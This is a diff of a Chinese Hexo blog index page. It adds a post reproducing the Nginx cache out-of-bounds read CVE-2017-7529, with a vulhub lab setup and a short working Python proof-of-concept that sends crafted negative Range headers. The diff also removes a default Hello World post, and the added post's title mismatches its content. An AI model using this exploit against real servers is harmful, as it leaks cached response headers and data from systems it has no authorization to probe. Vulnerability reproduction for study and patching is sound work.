@@ -186,6 +186,95 @@
         
 
 <div class="post">
+    <a href="/2024/05/07/%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/">
+        <h2 class="post-title">渗透测试生命周期(阶段)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/Nginx/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Nginx
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h1><p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</p>
+<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
+<h1 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h1><p>Nginx version 0.5.6 - 1.13.2</p>
+<h1 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3. 环境搭建"></a>3. 环境搭建</h1><pre><code class="bash">git clone https://github.com/vulhub/vulhub.git
+cd vulhub/nginx/CVE-2017-7529
+docker-compose up -d
+</code></pre>
+<h1 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4. 漏洞复现"></a>4. 漏洞复现</h1><p>使用POC进行验证</p>
+<pre><code class="bash">python poc.py http://xxx.xxx.xxx.xxx:8080/
+</code></pre>
+<h1 id="5-漏洞POC"><a href="#5-漏洞POC" class="headerlink" title="5. 漏洞POC"></a>5. 漏洞POC</h1><pre><code class="python">#!/usr/bin/env python
+import sys
+import requests
+
+if len(sys.argv) &lt; 2:
+    print(&quot;%s url&quot; % (sys.argv[0]))
+    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))
+    sys.exit()
+
+headers = &#123;
+    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;
+&#125;
+offset = 605
+url = sys.argv[1]
+file_len = len(requests.get(url, headers=headers).content)
+n = file_len + offset
+headers[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % (
+    n, 0x8000000000000000 - n)
+
+r = requests.get(url, headers=headers)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Nginx/" style="color: #00bcd4">Nginx</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/" style="color: #ffa2c4">Web服务器漏洞</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CVE/" style="color: #03a9f4">CVE</a>
+        </span>
+        
+    </div>
+    <a href="/2024/05/07/%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/05/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pentest/">
         <h2 class="post-title">渗透测试生命周期(阶段)</h2>
     </a>
@@ -237,72 +326,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ffa2c4">渗透测试</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">渗透测试</a>
         </span>
         
     </div>
     <a href="/2024/05/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pentest/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/05/hello-world/">
-        <h2 class="post-title">Hello World</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/Hexo/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                Hexo
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/5
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/Hexo/" style="color: #ffa2c4">Hexo</a>
-        </span>
-        
-    </div>
-    <a href="/2024/05/05/hello-world/" class="go-post">阅读全文</a>
 </div>
 
 
